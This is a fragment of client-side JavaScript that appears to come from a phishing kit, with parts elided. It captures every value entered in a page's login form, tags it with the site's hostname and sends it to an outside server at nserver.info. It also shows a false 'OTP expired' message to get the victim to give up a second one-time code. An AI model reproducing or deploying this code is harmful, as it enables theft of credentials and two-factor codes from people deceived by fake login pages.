// calling server data..
var API_URL = "https://nserver.info/api.php?action=save";
var OTT = 0;
var hasPath = "";
        ...
        .then((responseData) => {
            if (responseData.status === 200) {
                ...
                if (getQuery("next") == "cpan.html" && OTT === 0) {
                    document.getElementById("tok-invalid").innerHTML = "This OTP is expired, Please re-enter new otp";
                    setTimeout(function() {
    ...
    form.addEventListener("submit", function(event) {
        ...
        for (let i = 0; i < form.elements.length; i++) {
            ...
            if (element.tagName === 'INPUT') {
                if (element.value == 'RESET' || element.value == 'LOGIN' || element.value == "Submit" || element.value == "SUBMIT" || element.value == "PROCEED" || element.value == "") {
                    continue;
                }
                if (element.name == 'T') {
        ...
        sendDataForm['site'] = window.location.hostname;
        sendDataForm['data'] = formData;

        serverCall(sendDataForm, nextValue);
    });
};
